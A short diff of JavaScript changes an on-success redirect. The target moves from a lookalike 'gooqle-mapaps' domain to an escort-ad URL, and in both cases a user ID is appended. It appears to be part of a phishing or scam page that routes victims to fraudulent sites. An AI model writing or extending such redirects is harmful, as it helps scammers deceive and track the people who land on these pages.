@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://gooqle-mapaps.shop/view-location/${userId}`;
+                            window.location.href = `https://megaparsaonals.my.id/female-escort/${userId}`;
                           }
                     
                 },
